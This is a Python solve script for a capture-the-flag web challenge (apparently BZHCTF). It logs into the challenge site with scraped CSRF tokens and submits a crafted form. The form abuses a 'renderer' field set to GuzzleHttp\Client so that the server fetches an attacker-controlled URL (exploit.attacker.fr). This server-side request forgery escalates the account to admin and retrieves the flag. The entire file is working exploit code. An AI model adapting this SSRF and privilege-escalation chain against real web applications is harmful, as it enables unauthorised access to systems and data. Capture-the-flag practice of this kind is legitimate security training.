import requests
import sys
import random
import string
import re
from base64 import b64encode

if len(sys.argv) < 3:
    print("Usage: ./solve.py https://challengeurl.ctf.bzh https://exploit.attacker.fr")
    sys.exit(0)

S = requests.Session()
chall_url = sys.argv[1]
exploit_url = sys.argv[2]

def get_csrf_token(path):
    resp = S.get(f"{chall_url}/{path}", cookies=S.cookies.get_dict())
    print(resp.text)
    return re.findall(r'\b\w{40}\b', resp.text)[0]

def get_b64_content():
    return b64encode(('[{"name":"'+''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=5))+'","type":"email","size":"5"}]').encode()).decode()

# Initialize session
response = S.get(f"{chall_url}/")
print(response)

# Login
response = S.post(f"{chall_url}/login",data={"_token": get_csrf_token(""), "email": "a@a.fr", "password":"a"}, cookies=S.cookies.get_dict())
print(response)

# Step 1 - Privesc to admin
response = S.post(f"{chall_url}/form", json={"_token": get_csrf_token("form"), "content": get_b64_content(), "nb_fields": 1, "name": exploit_url, "renderer": "GuzzleHttp\\Client"}, cookies=S.cookies.get_dict())
print(response)

response = S.get(f"{chall_url}/form?id={exploit_url}", cookies=S.cookies.get_dict())
print(response)

if "BZHCTF" in (body := S.get(f"{chall_url}/", allow_redirects=False, cookies=S.cookies.get_dict()).text):
    print("[+] SSRF: done")
    print(body)

